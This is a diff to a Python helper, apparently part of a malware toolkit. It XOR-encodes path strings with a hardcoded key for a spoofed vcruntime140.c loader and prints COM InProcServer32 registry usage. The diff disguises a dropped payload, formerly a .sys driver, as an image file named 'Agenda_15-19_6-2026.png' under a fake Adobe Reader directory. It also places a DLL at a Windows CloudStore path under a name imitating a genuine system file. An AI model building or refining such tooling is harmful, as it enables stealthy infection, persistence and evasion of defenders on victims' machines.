@@ -8,11 +8,11 @@ import sys
 CK2 = b"9832gf2bc29_120e9hd10c))b@@!11"
 CK2_LEN = 30
 DEFAULT_SUFFIX = "InProcServer32"
-DEFAULT_SYS_NAME = "amd64.sys"
-DEFAULT_SYS_SUBDIR = "Drivers"
-DEFAULT_SYS_DIR = r"C:\ProgramData\Adobe\ARM\Reader_26.001.21563\Library"
-DEFAULT_DLL_DIR = r"C:\ProgramData\Adobe\ARM\Reader_26.001.21563\Library"
-DEFAULT_DLL = "mmdevlib.dll"
+DEFAULT_SYS_NAME = "Agenda_15-19_6-2026.png"
+DEFAULT_SYS_SUBDIR = "Downloads"
+DEFAULT_SYS_DIR = r"C:\ProgramData\Adobe\ARM\Reader_26.001.21563"
+DEFAULT_DLL_DIR = r"%LOCALAPPDATA%\Microsoft\Windows\CloudStore\Shell"
+DEFAULT_DLL = "Windows.CloudStore.Schema.Shell.dll"
 GUID_RE = re.compile(
     r"^\{?([0-9A-Fa-f]{8})-([0-9A-Fa-f]{4})-([0-9A-Fa-f]{4})-([0-9A-Fa-f]{4})-([0-9A-Fa-f]{12})\}?$"
 )
@@ -187,7 +187,7 @@ def print_reg_usage(clsid: str, suffix: str) -> None:
 
 
 def print_paste_sys(drop_dir: str, sys_name: str, sys_subdir: str) -> None:
-    """Adobe-style .sys drop: e_dir1..N, e_sys_dir, e_sys_path (paste into vcruntime140.c)."""
+    """Adobe-style payload drop: e_dir1..N, e_sys_dir, e_sys_path (paste into vcruntime140.c)."""
     drop_dir = normalize_win_path(drop_dir)
     prefixes = mkdir_prefixes(drop_dir)
     sys_dir_path = f"{drop_dir}\\{sys_subdir}"
@@ -310,7 +310,7 @@ def build_parser() -> argparse.ArgumentParser:
     parser = argparse.ArgumentParser(
         description=(
             "XOR-encode vcruntime140.c path blobs. "
-            ".sys and .dll can use different directories (--sys-dir vs --dll-dir)."
+            "PNG payload and DLL can use different directories (--sys-dir vs --dll-dir)."
         )
     )
     parser.add_argument(
@@ -348,17 +348,17 @@ def build_parser() -> argparse.ArgumentParser:
     parser.add_argument(
         "--sys",
         default=DEFAULT_SYS_NAME,
-        help=f".sys filename under --sys-subdir (default: {DEFAULT_SYS_NAME})",
+        help=f"PNG filename under --sys-subdir (default: {DEFAULT_SYS_NAME})",
     )
     parser.add_argument(
         "--sys-subdir",
         default=DEFAULT_SYS_SUBDIR,
-        help=f"Subdir under --sys-dir for .sys (default: {DEFAULT_SYS_SUBDIR})",
+        help=f"Subdir under --sys-dir for PNG (default: {DEFAULT_SYS_SUBDIR})",
     )
     parser.add_argument(
         "--full",
         action="store_true",
-        help="Emit .sys blobs (e_dir*, e_sys_dir, e_sys_path) for --sys-dir or -d",
+        help="Emit PNG path blobs (e_dir*, e_sys_dir, e_sys_path) for --sys-dir or -d",
     )
     parser.add_argument(
         "--with-code",
@@ -386,7 +386,7 @@ def build_parser() -> argparse.ArgumentParser:
         '  python3 getCLSID.py --dll-dir "%LOCALAPPDATA%\\Microsoft\\Windows\\CloudStore\\Shell" \\\n'
         '    --dll "Windows.CloudStore.Schema.Shell.dll"\n'
         "\n"
-        "  # .sys only (Adobe) — keep existing block or regenerate\n"
+        "  # PNG drop (Adobe Downloads) — paste into vcruntime140.c\n"
         f'  python3 getCLSID.py --sys-dir "{DEFAULT_SYS_DIR}" --full\n'
         "\n"
         "  # Both dirs in one run\n"
@@ -430,7 +430,7 @@ def main() -> int:
 
         if paste:
             if sys_dir and include_sys:
-                print_section(".sys drop")
+                print_section("PNG drop")
                 print_paste_sys(sys_dir, args.sys, args.sys_subdir)
                 print()
             if dll_dir and dll_name:
